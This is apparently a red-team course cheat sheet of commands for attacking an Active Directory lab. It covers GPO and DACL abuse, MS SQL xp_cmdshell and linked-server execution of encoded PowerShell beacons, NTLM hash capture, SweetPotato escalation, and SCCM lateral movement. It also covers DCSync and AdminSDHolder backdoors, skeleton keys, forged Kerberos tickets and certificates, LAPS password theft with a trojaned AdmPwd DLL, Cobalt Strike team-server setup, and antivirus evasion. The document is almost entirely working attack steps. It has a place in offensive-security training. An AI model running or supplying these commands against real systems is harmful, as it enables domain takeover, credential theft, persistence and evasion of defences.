powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

Use the **New-GPO** cmdlet to create and link a new GPO:
```
powershell New-GPO -Name "Evil GPO"
```

```
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
```

Apply the GPO to the target OU:
```
powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

Remember that HKLM autoruns require a reboot to execute.

## Modify domain group membership
```
run net group "Oracle Admins" bfarmer /add /domain
run net user bfarmer /domain
```

# RSAT
If GroupPolicy module is not installed:
```
Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
Install-WindowsFeature -Name GPMC
```

Create a new GPO and link it to OU:
```
powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

Upload payload:
```
cd \\dc-2\software
upload C:\Payloads\pivot.exe
```

Find writeable software share with PowerView:
```
powershell Find-DomainShare -CheckShareAccess
```

Search in each share:
```
powershell Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
```

```
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString
```
**-Value** can alternatively be **%COMSPEC% /b /c start /b /min**

```
gpupdate /target:computer /force
```
# SharpGPOAbuse
SharpGPOAbuse cannot create GPOs so we have to do that with RSAT or use existing GPOs.

Add immediate scheduled task to **PowerShell Logging** GPO, executes as soon as it is applied:
```
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
## Discretionary access control lists
Find any principal that has GenericAll, WriteProperty or WriteDacl on jadams:
```
powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl
```

```
powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
```

Wider search:
```
powershell Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

In BloodHound:
```
MATCH (g1:Group), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```

Narrow it down:
```
MATCH (g1:Group {name:"1ST LINE SUPPORT@DEV.CYBERBOTIC.IO"}), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```
## Reset user password
```
make_token DEV\jking Purpl3Drag0n
run net user jadams N3wPassw0rd! /domain
```
# MS SQL Servers
[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and [SQLRecon](https://github.com/skahwah/SQLRecon) is good for enumerating and interacting with MS SQL Servers.

```
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powershell Get-SQLInstanceDomain
```

In BloodHound:
```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

```
powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
```

```
powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
```

For multiple SQL servers:
```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

Search one or more instances for databases that contain particular keywords in the column names:
```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```

Shows if bfarmer has sysadmin role:
```
powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
```

With impacket:
```
proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```

SQLRecon:
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
```

```
powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```

```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
```

Query:
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"
```
## MS SQL NetNTLM capture
Listen to incoming requests:
```
execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```

Execute **EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1** on the MS SQL server, where 10.10.17.231 is the server running Inveigh.

Crack with john with **--format=netntlmv2 --wordlist=rockyou.txt svc_mssql-netntlmv2**

Crack with hashcat with **-a 0 -m 5600 svc_mssql-netntlmv2 rockyou.txt**

With WinDivert + rportfwd combo (see NTLM relaying section), capture with smbserver.py:
```
python3 /usr/local/bin/smbserver.py -smb2support pwn .
```
## MS SQL impersonation
We can discover accounts to impersonate manually using the following queries:
```
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```

The IDs don't mean much, so we can look them up with:
```
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

You can also write your own SQL query that will join these two, or use SQLRecon's impersonate module:
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
```

```
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
```

SQLRecon modules can also be run in "impersonation mode" by prefixing the module name with an i and specifying the principal to impersonate:
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
```
## MS SQL command execution
With PowerUpSQL, enables xp_cmdshell for you:
```
powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

Manually in heidi or mssqlclient.py:
```
EXEC xp_cmdshell 'whoami';
```
Gives error because xp_cmdshell has to be enabled first.

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Or with SQLRecon:
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```

Open ports:
```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

rportfwd 8080 127.0.0.1 80
```

Next, host **smb_x64.ps1** at **/b** on the team server.  We know SMB will work because we can validate that port **445** is open on the target SQL server.

Spawn beacon:
```
EXEC xp_cmdshell 'powershell -w hidden -enc <payload>';
```
There is a limit in SQL command length to prevent you from sending large payloads directly in the query.

Link beacon.
## MS SQL lateral movement
Find links:
```
SELECT * FROM master..sysservers;
SELECT srvname, srvproduct, rpcout FROM master..sysservers;

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
```

Query remote instance using **OpenQuery**:
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
```
Note the double and single quotes.

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell'' ');

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
```

Enable xp_cmdshell using RPC out if its enabled:
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io] EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io] 
```

Find links with Get-SQLServerLinkCrawl:
```
powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io

execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
```

```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

rportfwd 8080 127.0.0.1 80
```

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc <payload>'' ')

EXEC('xp_cmdshell ''powershell -w hidden -enc <payload>''') AT [sql-1.cyberbotic.io]
```

Link beacon.

Deeper:
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -w hidden -enc <payload>'''' '')')
```

To search over the links use:
```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
```

Note the "employees" table. Next, list its columns:
```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"
```

```
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
```
## MS SQL privilege escalation
Find SeImpersonatePrivilege:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
```

Exploit:
```
execute-assembly C:\Tools\SweetPotato\bin\Debug\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <tcp payload>"
```

```
connect localhost 4444
```
# Microsoft configuration manager
[SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
## Enumeration
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
```

```
powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl
```

```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
```

```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
```

```
make_token DEV\jking Qwerty123

execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
```

Administrative users:
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner
```

```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner
```

```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
```

```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
```
## Network Access Account Credentials
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner

make_token cyberbotic.io\sccm_svc Cyberb0tic
```
## Lateral movement
Execute a command on every device in the DEV collection:
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
```

We can force it to execute as **SYSTEM** using the **-s** parameter, and this will execute on every machine regardless of whether a user is currently logged in or not:
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```
# Domain dominance
## DCSync backdoor
```
dcsync dev.cyberbotic.io DEV\krbtgt
```
Error.

In powerview:
```
powershell Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
```

```
dcsync dev.cyberbotic.io DEV\krbtgt
```
Now works.
## AdminSDHolder
```
run net group "Domain Admins" bfarmer /add /domain
```
Access denied.

```
powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All
```

```
run net group "Domain Admins" /domain
```

```
run net group "Domain Admins" bfarmer /add /domain
```
Works.
## Remote registry backdoor
```
powershell Add-RemoteRegBackdoor -Trustee DEV\bfarmer
```

```
powershell Get-RemoteMachineAccountHash -ComputerName srv-2
```
See silver tickets for this.
## Skeleton key
Only applicable to domain controllers.

Install key:
```
mimikatz !misc::skeleton
```

```
make_token DEV\Administrator mimikatz
```
## Silver tickets
Let's say we dumped Kerberos keys from Workstation 1 from a SYSTEM Beacon.

On your Windows attacking machine, use Rubeus to forge a service ticket for nlamb and the CIFS service:
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=

steal_token 5668
```

With mimikatz:
```
mimikatz kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv-2 /service:cifs /aes256:<eKeys> /ticket:srv2-cifs.kirbi
```
**/user** is the username to impersonate
**/domain** is the current domain name
**/sid** is the current domain sid
**/target** is the target machine
**/aes256** is the AES256 key for the target machine
**/ticket** is the filename to save the ticket as

```
make_token DEV\Administrator FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\srv2-cifs.kirbi
```

| Technique         | Required service tickets |
| ----------------- | ------------------------ |
| psexec            | host, cifs               |
| winrm             | host, http               |
| dcsync (DCs only) | ldap                     |
## Golden tickets
A common method for obtaining the krbtgt hash is to use dcsync from the context of a domain admin:
```
dcsync dev.cyberbotic.io DEV\krbtgt
```

The ticket can be forged offline using Rubeus.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
```

And then imported into a logon session to use:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

steal_token 5060
```

With mimikatz:
```
mimikatz kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:<eKeys> /ticket:golden.kirbi
```

```
make_token DEV\Administrator FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\golden.kirbi
```
## Diamond tickets
Diamond tickets can be created with Rubeus:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```
**/tgtdeleg** uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
**/ticketuser** is the username of the user to impersonate.
**/ticketuserid** is the domain RID of that user.
**/groups** are the desired group RIDs (512 being Domain Admins).
**/krbkey** is the krbtgt AES256 hash.

Rubeus **describe** will now show that this is a TGT for the target user:
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
```
## Forged certificates
[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

Once on a CA, **SharpDPAPI** can extract the private keys:
```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
```

[ForgeCert](https://github.com/GhostPack/ForgeCert)

Save the private key and certificate to a **.pem** file and convert it to a **.pfx** with openssl.  Then, build the forged certificate with **ForgeCert**:
```
C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
```

Even though you can specify any **SubjectAltName**, the user does need to be present in AD.  We can now use Rubeus to request a legitimate TGT with this forged certificate:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap
```

We're not limited to forging user certificates; we can do the same for machines.  Combine this with the S4U2self trick to gain access to any machine or service in the domain.
# Forest & domain trusts
## Parent/child
```
powershell Get-DomainTrust
```

### Golden ticket
```
powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
```

```
powershell Get-DomainController -Domain cyberbotic.io | select Name
```

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap
```

Then import it into a logon session.

With mimikatz:
```
mimikatz kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633 /aes256:<eKeys> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi
```
**/user** is the username to impersonate
**/domain** is the current domain
**/sid** is the current domain SID
**/sids** is the SID of the target group to add ourselves to
**/aes256** is the AES256 key of the current domains krbtgt account
**/startoffset** sets the start time of the ticket to 10 mins before the current time
**/endin** sets the expiry date for the ticket to 60 mins
**/renewmax** sets how long the ticket can be valid for it renewed

```
make_token CYBER\Administrator FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
```
### Diamond ticket
The Rubeus **diamond** command also has a **/sids** parameter, with which we can supply the extra SIDs we want in our ticket:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```
## One-way (inbound)
```
powershell Get-DomainTrust
```

```
powershell Get-DomainComputer -Domain subsidiary.external -Properties DnsHostName
```

Alternative:
```
SharpHound -c DcOnly -d subsidiary.external
```

```
powershell Get-DomainForeignGroupMember -Domain subsidiary.external
```

```
powershell ConvertFrom-SID <SID>
```

```
powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external
```

```
powershell Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName
```

Use real password for this to work:
```
make_token DEV\jadams TrustNo1
ls \\ad.subsidiary.external\c$
```

Or use RC4/AES keys:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:<eKeys> /opsec /nowrap
```

Request a referral ticket from the current domain for the target domain:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:<...ticket...> /nowrap
```

Use the inter-realm TGT to request a TGS in the target domain:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:<...ticket...> /nowrap
```

Write base64 encoded ticket to file:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```

```
make_token DEV\jadams FakePass
kerberos_ticket_use C:\Users\Daniel\Desktop\subsidiary.kirbi
ls \\ad.subsidiary.external\c$
```
## One way (outbound)
```
powershell Get-DomainTrust -Domain cyberbotic.io
```

Find principals in cyberbotic.io that are note native to that domain but are from zeropointsecurity.local:
```
powershell Get-DomainForeignGroupMember -Domain cyberbotic.io
```

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
```

```
powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
```

```
powershell Get-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
```

There are two options for obtaining the key material.  One is to move laterally to the DC itself and dump from memory:
```
mimikatz lsadump::trust /patch
```

The second is to use DCSync with the TDO's GUID:
```
powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid

mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
```

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
```

```
powershell Get-Domain -Domain msp.org
```

```
net logons
ps
inject 4960 x64 tcp-local
```

```
powershell Get-Domain
remote-exec winrm sql01.zeropointsecurity.local whoami; hostname
jump winrm64 sql01.zeropointsecurity.local pivot-sql-1
```
# LAPS
Check for **AdmPwd.dll**, then LAPS is enabled:
```
ls C:\Program Files\LAPS\CSE
```

Find GPOs that have LAPS or some other term in the name:
```
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name GPCFileSysPath | fl
```

Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null:
```
powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostName

powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```

Try to find the correct GPO and download the LAPS configuration:
```
ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{...name from above...}\Machine

download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{...name from above...}\Machine\Registry.pol
```

Parse-PolFile:
```
Parse-PolFile .\Registry.pol
```

In BloodHound:
```
MATCH (c:Computer {haslaps: true}) RETURN c
```

```
MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

```
powershell Get-Command *AdmPwd*
powershell Find-AdmPwdExtendedRights -Identity Workstations | fl
```

```
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

powershell ConvertFrom-SID <SID>
```

Or use [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit):
```
powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
powershell Find-LAPSDelegatedGroups
```

To get a computer's password, simply read the attribute:
```
powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd

make_token .\LapsAdmin 1N3FyjJR5L18za
```

Domain admins can read all LAPS password attributes:
```
powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

If not domain admin:
```
make_token DEV\jking Purpl3Drag0n
powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
rev2self
make_token .\lapsadmin <password>
```

```
powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ReseolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier
```
```
make_token DEV\jking Purpl3Drag0n
powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
## LAPS persistence
Convert time: https://www.epochconverter.com/ldap

If we have password for a sensitive machine we can prevent it from updating its password by setting expiration date into the future:
```
powershell Get-DomainObject -Identity wkstn-2 -Properties ms-mcs-admpwdexpirationtime
```

```
powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```

```
powershell Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

```
powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
## LAPS backdoors
Source code: [admpwd](https://github.com/GreyCorbel/admpwd)

```
ls C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\
```

Add backdoor in **Main/AdmPwd.PS/Main.CS** after **PasswordInfo pi** line:
```
var line = $"{pi.ComputerName} : {pi.Password}";
System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
```

Compile the project and upload AdmPwd.PS.dll to the machine:
```
upload C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll
```

Run **Get-AdmPwdPassword** and then check C:\\Temp.

```
ls C:\Temp
shell type C:\Temp\LAPS.txt
```
# Cobalt strike
```
sudo vim /etc/systemd/system/teamserver.service
```

```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target
```

```
sudo systemctl daemon-reload
sudo systemctl status teamserver.service
sudo systemctl start teamserver.service
sudo systemctl status teamserver.service
sudo systemctl enable teamserver.service
```
## SMB listener
Open powershell and run this command and take copy a pipe name similar to these:
```
ls \\.\pipe\
```
# Bypassing antivirus
**jump psexec64** user a compiled x64 service binary and **jump winrm64** uses x64 PowerShell.

Check detected threats with Get-MpThreatDetection:
```
remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources
```

```
Get-MpThreatDetection | sort $_InitialDetectionTime | select -First 1
```

**Artifact kit** modifies compiled artifacts and **resource kit** modifies script-based artifacts.

Check with ThreatCheck:
```
C:\Tools\ThreatCheck\ThreatCheck\bin\debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc.exe
```
## Artifact kit
C:\\Tools\\cobaltstrike\\arsenal-kit\\kits\\artifact

Build:
```
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
```

Check with ThreatCheck, and look for IOCs in Ghidra. Create a new non-shared project from File > New Project, then import your artifact by going to File > Import File:
```
C:\Tools\ghidra-10.3.1\ghidraRun.bat
```

Double-click on the imported file to open it in the CodeBrowser.  When prompted, select Yes to analyze the binary (the default selected analyzers are fine).  This may take a minute or so to complete - you will see a progress bar in the bottom-right of the window.

